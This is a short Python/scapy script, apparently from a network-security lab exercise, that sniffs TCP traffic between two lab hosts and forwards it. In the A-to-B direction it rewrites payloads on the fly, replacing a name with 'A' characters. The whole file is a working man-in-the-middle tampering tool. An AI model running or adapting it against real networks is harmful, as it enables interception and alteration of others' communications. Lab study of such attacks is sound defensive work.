#!/usr/bin/env python3
from scapy.all import *

# Define variables
MY_NAME = "Nigel"
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

# Function to spoof packets
def packet_spoofing(packet):
    # If packet is from A to B
    if packet[IP].src == IP_A and packet[IP].dst == IP_B:
        # Create a new IP packet from the old packet
        new_packet = IP(bytes(packet[IP]))
        # Delete checksum fields and payload from TCP layer
        del(new_packet.chksum)
        del(new_packet[TCP].payload)
        del(new_packet[TCP].chksum)

        if packet[TCP].payload:
            # Extract and modify the payload data
            data = packet[TCP].payload.load
            data = data.decode()
            print("Original data: " + data)
            new_data = data.replace(MY_NAME, 'A' * len(MY_NAME))
            print("Modified data: " + new_data)
            # Send the modified packet
            send(new_packet/new_data, verbose=False)
        else:
            # Send the unmodified packet
            send(new_packet, verbose=False)
    # If packet is from B to A
    elif packet[IP].src == IP_B and packet[IP].dst == IP_A:
        # Create a new IP packet from the old packet
        new_packet = IP(bytes(packet[IP]))
        # Delete checksum fields from TCP layer
        del(new_packet.chksum)
        del(new_packet[TCP].chksum)
        # Send the packet
        send(new_packet, verbose=False)

# Define the filter for sniffing packets
my_filter = 'tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)'
# Sniff packets on eth0 interface, apply filter, and call packet_spoofing function
sniffed_packet = sniff(iface='eth0', filter=my_filter, prn=packet_spoofing)
